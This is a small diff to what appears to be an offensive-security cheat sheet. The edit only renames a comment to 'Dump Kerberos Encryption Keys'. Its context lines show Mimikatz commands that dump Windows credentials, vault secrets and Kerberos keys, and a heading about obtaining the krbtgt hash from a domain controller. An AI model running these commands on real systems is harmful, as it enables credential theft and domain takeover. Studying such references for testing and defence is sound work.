@@ -254,7 +254,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 #Dump Windows Secrets
 vault::list
 vault::cred /patch
-#ekeys
+#Dump Kerberos Encryption Keys
 Invoke-Mimikatz –Command '"sekurlsa::ekeys"
 ```
 Get krbtgt hash on a DC
